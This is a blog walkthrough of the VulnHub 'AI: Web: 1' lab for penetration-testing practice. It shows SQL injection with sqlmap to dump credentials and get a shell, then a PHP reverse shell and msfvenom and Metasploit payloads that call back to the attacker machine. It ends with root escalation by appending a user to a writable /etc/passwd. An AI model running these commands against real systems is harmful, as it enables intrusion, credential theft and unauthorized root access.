@@ -1,0 +1,194 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">AI: Web: 1 Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/ai-web-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-08-28T07:10:18+00:00">August 28, 2019</time><time class="updated" datetime="2025-06-10T20:11:15+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another CTF challenge called “AI: Web: 1”. It is available on Vulnhub for the purpose of Penetration Testing practices. This lab is not that difficult if we have the proper basic knowledge of cracking the labs. The credit for making this lab goes to <a style="color: #000000;" href="https://twitter.com/arif_xpress">Mohammad Ariful</a>. Let’s start and learn how to successfully breach it.</span></p>
+<p><strong><span style="color: #000000;">Level: Intermediate</span></strong></p>
+<p><span style="color: #000000;">Since these labs are available on Vulnhub Website. We will be downloading the lab from this <a style="color: #000000;" href="https://www.vulnhub.com/entry/ai-web-1,353/">link</a>.</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Netdiscover</span></li>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Browsing HTTP Service</span></li>
+<li><span style="color: #000000;">Directory Bruteforce using dirb</span></li>
+<li><span style="color: #000000;">SQL Injection for finding Credentials</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">SQL Injection to invoke OS-Shell</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Writable etc/passwd file</span></li>
+</ul>
+<h3><span style="color: #000000;"><strong>Walkthrough </strong></span></h3>
+<h3><span style="color: #800000;"><strong>Network Scanning </strong></span></h3>
+<p><span style="color: #000000;"><strong>NOTE: For this Lab, we will have to put the Network Setting of our Attacker Machine (Kali Linux) to NAT.</strong></span></p>
+<p><span style="color: #000000;">We will be running this lab in a Virtual Machine Player or Virtual Box. After running the lab, we used the netdiscover command tot check the IP Address of the lab.</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-7Lutxm7zdIY/XWYhBvm4bvI/AAAAAAAAgRM/D3SBNzpAvYEne0l2aD4e26PN0RsJdCfEgCLcBGAs/s1600/1.png"/></p>
+<p><span style="color: #000000;">This was found out to be 192.168.13.131.</span></p>
+<p><span style="color: #000000;">Now we will run an aggressive port scan using nmap to gain the information about the open ports and the services running on the target machine.</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.13.131</pre>
+<p><span style="color: #000000;">We learned from the scan that we have the port 80 open which is hosting Apache httpd service. We also gained the information about a robots.txt file, /m3diNf0/, /se3reTdir777/uploads directory available to enumerate.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-U3rb3MQTowc/XWYhEdriIII/AAAAAAAAgRw/lNZVnTn19uoIaJHzUR30Rlv1Zqwtb--QgCLcBGAs/s1600/2.png"/></p>
+<p><span style="color: #000000;">Since we got the port 80 open, we decided to browser the IP Address in the browser. It shows the following text” Not even Google search my contents!”.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-ch6KP_DxbFs/XWYhG7-xFmI/AAAAAAAAgSY/YmzdEYcFd04CsL9wmjZWDVTXx4Cp0-H7QCLcBGAs/s1600/3.png"/></p>
+<p><span style="color: #000000;">Let’s browser another page which we got in our port scan. When we open the /m3diNf0/ in our browser we get a Forbidden message as shown in the given image.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-wW6GiA_fGSY/XWYhI5nn59I/AAAAAAAAgS4/3YBWP836SKwDu1xbNDSxd7LtD8vIdHDYACLcBGAs/s1600/4.png"/></p>
+<p><span style="color: #000000;">During our port scan, we found another directory named /se3reTdir777/uploads/. Let’s try to browse it. On opening it in our Web Browser, we get a similar Forbidden Message as earlier.</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-GlB5uxSno7k/XWYhJ9VSneI/AAAAAAAAgTA/RDmIrEXm0ygJxSgWp1YVjU7cpZw5g9OLgCLcBGAs/s1600/5.png"/></strong></span></p>
+<p><span style="color: #000000;">To further enumerate, we performed a Directory Bruteforce on the m3diNf0 directory. This gave us an info.php page as shown in the given image. This could be of some use.</span></p>
+<pre class="lang:default decode:true">dirb http://192.168.13.131/m3diNf0/</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-vJDXbzVirrA/XWYhJ0eZn8I/AAAAAAAAgS8/qidIlWluQ8cYOG1OiKhk4uxuXb2nVLgWACLcBGAs/s1600/6.png"/></p>
+<p><span style="color: #000000;">After finding the info.php page in the Directory bruteforce, we tried to browse this page on our browser. It opened up as shown in the given image. We will keep this aside as it gives us some valuable information for further.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/--5GNDYj6H58/XWYhJyN3G6I/AAAAAAAAgTE/LT0oe6w7Rxs_Vo8U9l0Ta_-XYk4lcczMgCLcBGAs/s1600/7.png"/></p>
+<p><span style="color: #000000;">Previously we tried to open the se3reTdir777/uploads. Now, we tried to browse the se3reTdir777 directory. It gives us a User ID Submission Form as shown in the image given below.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-5BJTLF8RQ98/XWYhKnyXd8I/AAAAAAAAgTI/Msy03GqH4oQRPZMGHSPJOQlFg3Lye3rnACLcBGAs/s1600/9.png"/></p>
+<p><span style="color: #000000;">We tried to further enumerate the form by entering the “User ID” in the form, It tells us that there is an injection vulnerability here. We extracted the following information from it.:</span></p>
+<p><span style="color: #000000;">Id: 1</span></p>
+<p><span style="color: #000000;">First Name: admin</span></p>
+<p><span style="color: #000000;">Last Name: admin</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-rhO7F5hsPLo/XWYhBRNJXkI/AAAAAAAAgRE/Kgd4wVbhuVsSAe2f_VU5LaRPVDUnlze2gCLcBGAs/s1600/10.png"/></p>
+<p><span style="color: #000000;">Now we entered User ID as 1 and captured the ongoing packet using BurpSuite. We did this because we are going to need it in the exploiting the SQL Injection through sqlmap.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-tp9k0K0qW_w/XWYhBdE8-HI/AAAAAAAAgRI/177idPgqox4aYHnQpp-wJD-7t2JUVEDgACLcBGAs/s1600/11.png"/></p>
+<p><span style="color: #000000;">We copied the request captured and created a text file and pasted it. We named it req.txt. We will be using this request to exploit the SQL Injection. After working for a while, sqlmap extracted the “aiweb1” database as shown in the image given below.</span></p>
+<pre class="lang:default decode:true">sqlmap -r req.txt -D aiweb1 --dbs --batch</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-801pa2tb8C8/XWYhCX2s4PI/AAAAAAAAgRQ/jzTBKWzF38cxy_aY4H3_DEDanIYbtDkbwCLcBGAs/s1600/12.png"/></p>
+<p><span style="color: #000000;">Now, to further enumerate, we used the –dump-all parameter. This will allow the sqlmap tool to dump all the data that it can find while exploiting the SQL Injection on our target machine.</span></p>
+<pre class="lang:default decode:true">sqlmap -r req.txt -D aiweb1 --dump-all  --batch</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-zKXGZc4SvLk/XWYhCfrd8gI/AAAAAAAAgRU/brlpRsNEGBUJqCkJMMuGusDJNOOPxDMHgCLcBGAs/s1600/13.png"/></p>
+<p><span style="color: #000000;">After running the sqlmap with –dump-all parameter we get the usernames and encrypted passwords as shown in the image given below.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/--gfWpTxe0Ak/XWYhCr3E0HI/AAAAAAAAgRY/I94rAlfcDuYs0OlKdMvkyIC1tgGSNRmvACLcBGAs/s1600/14.png"/></p>
+<p><span style="color: #000000;">We copied the password form the terminal here and tried to decode them using the BurpSuite Decoder. After decoding, we have the following credentials.</span></p>
+<table>
+<tbody>
+<tr>
+<td width="35"><span style="color: #000000;"><strong>Id</strong></span></td>
+<td width="295"><span style="color: #000000;"><strong>Username</strong></span></td>
+<td width="421"><span style="color: #000000;"><strong>Password</strong></span></td>
+</tr>
+<tr>
+<td width="35"><span style="color: #000000;">1</span></td>
+<td width="295"><span style="color: #000000;">t00r</span></td>
+<td width="421"><span style="color: #000000;">FakeUserPassw0rd</span></td>
+</tr>
+<tr>
+<td width="35"><span style="color: #000000;">2</span></td>
+<td width="295"><span style="color: #000000;">aiweb1pwn</span></td>
+<td width="421"><span style="color: #000000;">MyEvilPass_f908sdaf9_sadfasf0sa</span></td>
+</tr>
+<tr>
+<td width="35"><span style="color: #000000;">3</span></td>
+<td width="295"><span style="color: #000000;">u3er</span></td>
+<td width="421"><span style="color: #000000;">N0tThisOneAls0</span></td>
+</tr>
+</tbody>
+</table>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-PEBVMixHqyY/XWYhC6GSzKI/AAAAAAAAgRc/SD1dheXLmTsLhHlLUP0meDg_ThX727aigCLcBGAs/s1600/15.png"/></p>
+<p><span style="color: #000000;">Now that we have the credentials, we will try to invoke an os-shell using the sqlmap tool. Here we provided the Database name with the –os-shell as a parameter for sqlmap. After performing the exploitation, it gives us the option to choose the web application language which it supports. Here we are choosing PHP.</span></p>
+<pre class="lang:default decode:true">sqlmap -r req.txt -D aiweb1 --os-shell</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-7qIHr4ODipQ/XWYhDcxQMuI/AAAAAAAAgRg/9CB8ziMNTvIkzqQlkxN3U9cO84Mi9uougCLcBGAs/s1600/16.png"/></p>
+<p><span style="color: #000000;">Following the choice of the web application language, we are asked if we want to provoke the full path disclosure. Here, we do want the full path so we answer yes. Now it asks the attacker the writable directory to be used for os shell. We chose a custom location.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-fLth7FZ9SM8/XWYhDhyZvkI/AAAAAAAAgRk/C2Xlt3tDYvs5EMnEWEVJq6vjXxzSElC4wCLcBGAs/s1600/17.png"/></p>
+<p><span style="color: #000000;">Now we will use the info.php page that we found earlier. On close inspection, we found the Document Root for this particular server. We found it to be <strong>“/home/www/html/web1x443290o2sdf92213”</strong>.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-rlqQaoCloGU/XWYhD9xjlyI/AAAAAAAAgRo/SzutKMlR0d4HJWjH4VgBkkzt8pK2KpPigCLcBGAs/s1600/18.png"/></p>
+<p><span style="color: #000000;">So, in order to get the os shell, we will be entering this document root location into our custom location as shown in the image given below. And we got our os-shell on the target machine.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Wahi4wSNC-g/XWYhD_KUO7I/AAAAAAAAgRs/7powZmazUpsWVJ91De_LMcXojjU5vGEEgCLcBGAs/s1600/19.png"/></p>
+<p><span style="color: #000000;">After getting the os shell, we ran the id command to check the user of which the shell is generated, Also, we tried to check if the /etc/passwd file is readable or not. It was readable. But this seemed like a dead end.</span></p>
+<pre class="lang:default decode:true">os-shell &gt; id
+os-shell &gt; cat /etc/passwd</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VVG5AP_r3m8/XWYhE6j-jJI/AAAAAAAAgR0/OPegAG9nWdUvyIDJzJqln35jheMtoO8iwCLcBGAs/s1600/20.png"/></span></p>
+<p><span style="color: #000000;">So, we went back to the sqlmap result. It showed us a link” /se3reTdir777/uploads/tmputvpz.php”. On opening, we have the upload page as shown in the image given below. We can see that we have the browse button where we can choose the path of our file and provide the path on the victim system, the location we want the file to save.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-iZBbpgRzqwk/XWYhFPvWmeI/AAAAAAAAgR4/4LT3nxy0YZ4R6LFoUkigdcWca8ropu-rQCLcBGAs/s1600/21.png"/></p>
+<p><span style="color: #000000;">We decided we will upload a php shell on this upload page. So, we edited the script to add the IP Address of our attacker machine.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-65Nl4GHIoPY/XWYhFA4bvlI/AAAAAAAAgR8/KDRR7DWKgJICJsDxsn_5wLQa8ihR8GatQCLcBGAs/s1600/22.png"/></p>
+<p><span style="color: #000000;">We directed the path of the php shell and click on upload button. After clicking we see the message as shown in the given image</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-tP-etfg7PpA/XWYhFaO24YI/AAAAAAAAgSA/dWfYrFXuJ0QIpIsoB-L9Q9ZC9BzwXjKVgCLcBGAs/s1600/23.png"/></p>
+<p><span style="color: #000000;">Now that we have successfully uploaded the shell file, it’s time to run the php file by browsing the file on the web browser as shown in the given image But we should run a netcat listener beforehand to capture the session.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-OJM92uecZz0/XWYhFyY_CYI/AAAAAAAAgSE/bxC2EfF7EpEePr2kELpv4BcLzJMv54sHgCLcBGAs/s1600/24.png"/></p>
+<p><span style="color: #000000;">As soon as we ran the shell, we got the shell in the netcat we started earlier.  This gave us an improper shell; we will use the python one-liner to convert it into a proper shell. After getting the proper shell we will traverse into tmp directory. Here, we will use the LinEnum script to further enumerate the target machine as shown in the image given below.</span></p>
+<pre class="lang:default decode:true">nc -lvp 1234
+python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@aiweb:/$ cd /tmp
+www-data@aiweb:/$ wget http://192.168.13.132:8000/LinEnum.sh
+www-data@aiweb:/$ chmod 777 LinEnum.sh
+www-data@aiweb:/$ ./LinEnum.sh</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-pm8h0MVs684/XWYhGHjSQaI/AAAAAAAAgSI/vH--UYz4SLk6PGFx5XcbBxS0V-dQjpI_gCLcBGAs/s1600/25.png"/></p>
+<p><span style="color: #000000;">Here on closer inspection, we can see that we have the read/ write sensitive files as /etc/passwd.</span></p>
+<p><span style="color: #000000;">As we have the /etc/passwd file writable, we will add a user in it with elevated privileges. To do this we will create the hash of that user using the openssl command. Here we created a user with salt user3, username as raj and password pass123.</span></p>
+<pre class="lang:default decode:true">openssl passwd -1 -salt user3 pass123</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-pnFGlAsXXHY/XWYhGSisfvI/AAAAAAAAgSQ/mEAGfL5fqrcg1BaPViT97PRvtKVw_xy9ACLcBGAs/s1600/27.png"/></p>
+<p><span style="color: #000000;">Now that we have the password hash let’s add our newly created user in the /etc/passwd file of the target machine. We did this using the echo command. Now let’s login as the new user. After that, we traversed to the root directory to find the flag.txt as shown in the image given below.</span></p>
+<pre class="lang:default decode:true">www-data@aiweb1:/tmp$ echo 'raj:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash' &gt;&gt;/etc/passwd
+www-data@aiweb1:/tmp$ tail /etc/passwd
+www-data@aiweb1:/tmp$ su raj
+www-data@aiweb1:/tmp$ cd /root
+www-data@aiweb1:~# ls
+www-data@aiweb1:~# cat flag.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Mpv9eGwXzWA/XWYhGwvN6II/AAAAAAAAgSU/Sdi1W3tkJkkuCKMccwT98k8hxwlL1F1GwCLcBGAs/s1600/28.png"/></p>
+<h3><span style="color: #800000;"><strong>II Method </strong></span></h3>
+<p><span style="color: #000000;">We can solve the lab using another method as well. For this, we will use the Metasploit Web Delivery payload. We created one with our attacker machine’s IP Address and server port. On running the exploit, we will get a script as shown in the image given below.</span></p>
+<pre class="lang:default decode:true">msf5 &gt; use exploit/multi/script/web_delivery
+msf5 exploit(multi/script/web_delivery) &gt; set lhost 192.168.13.132
+msf5 exploit(multi/script/web_delivery) &gt; set srvport 4567
+msf5 exploit(multi/script/web_delivery) &gt; exploit</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-6IXEMaeANtk/XWYhHCHQTmI/AAAAAAAAgSc/6wHjywpwaCctjhfOgyJlXergwmjgGCfHQCLcBGAs/s1600/30.png"/></p>
+<p><span style="color: #000000;">We will run the script in the OS Shell we invoked earlier as shown in the image.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-NRi3Xv-X8MI/XWYhHamNdRI/AAAAAAAAgSg/JThxtUo48OM0QiKcQDW1BD87lNasHyZdgCLcBGAs/s1600/31.png"/></p>
+<p><span style="color: #000000;">This gave us a meterpreter on the target machine as shown in the image given below</span></p>
+<pre class="lang:default decode:true">msf5 exploit(multi/script/web_delivery) &gt; session 1
+meterpreter &gt; sysinfo</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-2dKKUSpz4eU/XWYhHtZd2mI/AAAAAAAAgSk/wTMK50N6x9wxH5OMX2RXhUq9B5KdgDuhACLcBGAs/s1600/32.png"/></p>
+<h3><span style="color: #800000;"><strong>III Method</strong></span></h3>
+<p><span style="color: #000000;">We could also solve this lab in yet another method, but this time we will use msfvenom for our exploitation. We will create an exploit using msfvenom using the payload cmd/unix/reverse_python. This generated a python script as shown in the image.</span></p>
+<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_python lhost=192.168.13.132 lport=9876 R</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-d7wZ_BVuE1c/XWYhIJgaCfI/AAAAAAAAgSo/koahZbdufJg19u0t7uIpgKlUOxyz_CC6ACLcBGAs/s1600/33.png"/></p>
+<p><span style="color: #000000;">Again, let’s get back to our OS Shell to enter the script we generated using msfvenom. We will execute the script as shown in the image given below.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-QzJY-4sghxM/XWYhIXR1Z7I/AAAAAAAAgSs/0Ifnc8VtNYA7x9AdG0X85Drl91G9SBscACLcBGAs/s1600/34.png"/></p>
+<p><span style="color: #000000;">Before executing we will run a netcat listener to capture the session generated through the python script. We have the shell over our target machine form this method too.</span></p>
+<pre class="lang:default decode:true">nc -lvp 9876
+id
+whoami</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Kqap7kIpg2I/XWYhITYkXrI/AAAAAAAAgSw/J9yjqw-wH8MG7KXw8LGORYmcX4ZRJLEzwCLcBGAs/s1600/35.png"/></p>
+<h3><span style="color: #800000;"><strong>IV Method</strong></span></h3>
+<p><span style="color: #000000;">We will try to get the shell over the target machine using another method. In this method, we can execute the msfvenom generated script from the previous method. Now instead of running the netcat to capture the shell, we will use Metasploit’s multi/handler. We will set the payload, IP Address and lport and run the exploit command. Now we will run the msfvenom generated script to give us the shell. Now we will use the convert shell into meterpreter.</span></p>
+<pre class="lang:default decode:true">msf5 &gt; use exploit/multi/handler
+msf5 exploit(multi/handler) &gt; set payload cmd/unix/reverse_python
+msf5 exploit(multi/handler) &gt; set lhost 192.168.13.132
+msf5 exploit(multi/handler) &gt; set lport 9876
+msf5 exploit(multi/handler) &gt; exploit
+msf5 exploit(multi/handler) &gt; sessions -u 1
+msf5 exploit(multi/handler) &gt; sessions 2
+meterpreter &gt; sysinfo</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-BopxgVNYGsA/XWYhI_M5KgI/AAAAAAAAgS0/P1dI7P43H7kaJWi3zmgTRJZcx9aGYgi1ACLcBGAs/s1600/36.png"/></p>
+<p><strong><span style="color: #000000;">Author</span>:<span style="color: #000000;"> Rishabh Kant</span></strong><span style="color: #000000;"> is a Penetration tester, Certified Ethical Hacker and researcher Contact</span> <a href="https://www.linkedin.com/in/rishabh-kant-46a06814b/"><strong>here</strong></a></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
+<!-- YARPP Thumbnails -->
+<h3>Related posts:</h3>
+<div class="yarpp-thumbnails-horizontal">
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/chronos-vulnhub-walkthrough/" title="Chronos Vulnhub Walkthrough">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Chronos Vulnhub Walkthrough</span></a>
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/digital-world-local-fall-vulnhub-walkthrough/" title="digital world.local: FALL Vulnhub Walkthrough">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">digital world.local: FALL Vulnhub Walkthrough</span></a>
+</div>
+</div>
+            </div><!-- .entry-content -->
+            <footer class="post-footer entry-footer">
+                                                
+            </footer><!-- .entry-footer -->
+            
+	<nav class="navigation post-navigation" aria-label="Posts">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/grimtheripper-1-vulnhub-walkthrough/" rel="prev">GrimTheRipper: 1 Vulnhub Walkthrough</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/westwild-2-vulnhub-walkthrough/" rel="next">Westwild: 2 Vulnhub Walkthrough</a></div></div>
+	</nav>        </div>
